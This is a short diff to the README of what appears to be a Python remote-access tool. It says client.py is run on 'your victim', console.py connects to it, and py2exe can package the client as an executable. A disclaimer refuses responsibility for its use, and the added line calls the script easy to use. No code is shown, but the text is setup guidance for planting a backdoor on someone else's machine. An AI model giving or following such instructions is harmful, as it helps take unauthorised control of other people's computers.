@@ -21,7 +21,7 @@ python client.py
 ```
 
 client.py is your victim and you take connection with console.py. I dont take any responsibility what youre going to do with this code.
-Use py2exe to client.py to make it exe software.
+Use py2exe to client.py to make it exe software. This is pretty easy script to use. Just run client.py and connect with console.py.
 
 ##Commands
 
